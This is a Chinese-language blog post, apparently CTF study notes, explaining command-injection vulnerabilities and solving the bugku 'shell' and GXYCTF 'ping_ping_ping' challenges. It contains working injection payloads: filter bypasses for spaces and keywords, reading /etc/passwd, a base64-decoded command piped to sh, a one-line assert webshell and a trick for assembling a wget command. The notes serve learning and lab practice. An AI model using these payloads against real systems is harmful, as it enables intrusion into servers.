@@ -1,0 +1,691 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、发送邮件、转换图片等功能都可能出现该类漏洞。  常用命令在win或linux下，||: [command1]||[command2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞">
+<meta property="og:url" content="http://example.com/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、发送邮件、转换图片等功能都可能出现该类漏洞。  常用命令在win或linux下，||: [command1]||[command2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/%E6%A2%A6%E9%BE%99.png">
+<meta property="article:published_time" content="2022-03-24T09:49:04.000Z">
+<meta property="article:modified_time" content="2024-03-06T04:44:04.832Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/%E6%A2%A6%E9%BE%99.png">
+  
+  
+  
+  <title>命令执行漏洞 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-24 17:49" pubdate>
+          March 24, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、发送邮件、转换图片等功能都可能出现该类漏洞。</p>
+<!-- about -->
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>在win或linux下，<br>||: [command1]||[command2]表示先执行command1, 若command1为假，则执行command2;<br>&amp;&amp;: 先执行command1, 若为真，则执行command2<br>|: 表示只执行command2(在必须输入command1且只想返回command2(比如回显行数被限定)的时候有用)<br>&amp;: 先执行command1再执行command2<br>;: 前面的执行完执行后面的<br>ls &#x2F;(注意空格): 列出根目录下的所有文件<br>pwd: (print work directory), 用于立刻显示当前所在目录</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p>PHP:<br>system<br>exec<br>passthru<br>shell_exec<br>popen<br>proc_open</p>
+<p>Python:<br>system<br>popen<br>subprocess.call<br>spawn</p>
+<p>Java:<br>java.lang.Runtime.getRuntime().exec(command)</p>
+<h1 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h1><p>就是利用|、||、&amp;、&amp;&amp;</p>
+<h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p>就是将反引号内的输出当作输入执行<br>作业:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="命令执行绕过空格"><a href="#命令执行绕过空格" class="headerlink" title="命令执行绕过空格"></a>命令执行绕过空格</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-variable">$9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br><span class="hljs-variable">$</span>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span> //<span class="hljs-variable">$1</span>改成<span class="hljs-variable">$</span>加其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;<span class="hljs-built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">a=l;b=s;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br>echo <span class="hljs-string">&quot;bHM=&quot;</span> | base64 -d  <span class="hljs-regexp">//</span>base64绕过<span class="hljs-string">&#x27;ls&#x27;</span>---&gt;思路扩展，可否换成其他编码呢? <br><span class="hljs-regexp">/?in/</span>?s =&gt; <span class="hljs-regexp">/bin/</span>ls<br>cat <span class="hljs-regexp">/etc/</span>pass<span class="hljs-string">&#x27;w&#x27;</span>d       <span class="hljs-regexp">//</span>连接符绕过<br>cat<span class="hljs-variable">$x</span> <span class="hljs-regexp">/etc/</span>passwd       <span class="hljs-regexp">//</span>未定义的初始化变量绕过<br></code></pre></td></tr></table></figure>
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&gt;wget\<br>&gt;foo.\<br>&gt;<span class="hljs-keyword">com</span><br><span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">a</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure>
+<p>上述方法为通过命令行重定向<strong>写入命令</strong>，通过ls将这些命令写入文件a，最后执行</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="bugku-shell"><a href="#bugku-shell" class="headerlink" title="bugku shell"></a>bugku shell</h2><p>打开后发现是空白页面，根据提示:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$poc</span>=<span class="hljs-string">&quot;a#s#s#e#r#t&quot;</span>;<br><span class="hljs-variable">$poc_1</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-variable">$poc</span>);   <span class="hljs-comment">//把字符打散为数组</span><br><span class="hljs-variable">$poc_2</span>=<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">4</span>].<span class="hljs-variable">$poc_1</span>[<span class="hljs-number">5</span>]; <span class="hljs-comment">//asset</span><br><span class="hljs-variable">$poc_2</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]);<span class="hljs-comment">//asset($_GET[&#x27;s&#x27;]); asset():判断1个表达式是否成立，返回True和False(重点在于:里面的表达式会被执行)</span><br></code></pre></td></tr></table></figure>
+<p>于是输入&#x2F;?s&#x3D;system(‘ls’)<br>返回: flaga15808abee46a1d5.txt index.php </p>
+<p>所以这题讲了个啥？ 好像是科普了一个一句话木马<br>科普: assert是能执行shell命令的危险函数之一</p>
+<h2 id="ping-ping-ping-GXYCTF-命令联合执行"><a href="#ping-ping-ping-GXYCTF-命令联合执行" class="headerlink" title="ping_ping_ping GXYCTF  命令联合执行"></a>ping_ping_ping GXYCTF  命令联合执行</h2><p>进入后是一个ping网址，这类题见了8下3次了，属于命令执行漏洞(或sql注入)，需要对linux指令有一定了解<br>(这种网站路由器种经常会见到)<br>输入127.0.0.1，ping成功了，说明有命令执行漏洞(为什么呢? 某个wp说的，俺也8清楚….)<br>然后因为贫瘠的linux知识，于是先试试sql注入吧<br>闭合失败…..<br>那就是命令执行漏洞了<br>开始注</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1 | <span class="hljs-built_in">ls</span>     //成功回显flag.php<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span> flag.php      //回显<span class="hljs-string">&quot;fuxk your space&quot;</span>，说明检测空格，需要绕过   <br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-variable">$9index</span>.php     //回显<span class="hljs-string">&quot;fuxk your symbol&quot;</span>，没看懂....这下没辙了<br>/?ip=127.0.0.1;<span class="hljs-built_in">cat</span>%20flag.php    //<span class="hljs-string">&quot;fuxk your flag&quot;</span>，屏蔽flag关键词<br>/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`     //回显了index.php的内容<br></code></pre></td></tr></table></figure>
+<p>但是为什么只有后半部分的内容?</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">/?</span>ip<span class="hljs-operator">=</span><br><span class="hljs-operator">|</span>\&#x27;<span class="hljs-operator">|</span>\<span class="hljs-string">&quot;|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);  <span class="hljs-comment">//屏蔽了....特殊字符，正则匹配还是没学好....&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽空格</span><br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;    <span class="hljs-comment">//屏蔽关键词</span><br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;   <span class="hljs-comment">//屏蔽flag，贪婪匹配</span><br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);    <span class="hljs-comment">//执行</span><br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>;<br>  print_r(<span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-operator">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>好吧…前3个都能想办法绕过，但第4个….<br>有几种方法，都记录一下</p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php	有flag<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=ag;a=<span class="hljs-built_in">fl</span>;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php 有flag<br></code></pre></td></tr></table></figure>
+<p>然后有一些疑惑的地方:<br>为什么最终flag是在源码的注释里写的? 想了想明白了，这个是出题人挖的坑，因为flag.php文件写的flag就是用注释括起来的，于是最终嵌入html代码时就会只在源码中显示</p>
+<h3 id="bash-sh-base64"><a href="#bash-sh-base64" class="headerlink" title="bash $ sh +base64"></a>bash $ sh +base64</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|bash  <span class="hljs-regexp">//</span>将flag.php进行base64编码，然后<span class="hljs-string">&#x27;bash&#x27;</span>指执行前面的echo脚本(和源码拼接起来)<br><span class="hljs-regexp">//</span>当然这里的bash被过滤了，但是用sh也是一样滴<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|sh<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行漏洞</div>
+      <div>http://example.com/2022/03/24/命令执行漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 24, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/" title="战斗记忆">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">战斗记忆</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/" title="python闭包特性&amp;&amp;python函数装饰器">
+                        <span class="hidden-mobile">python闭包特性&amp;&amp;python函数装饰器</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
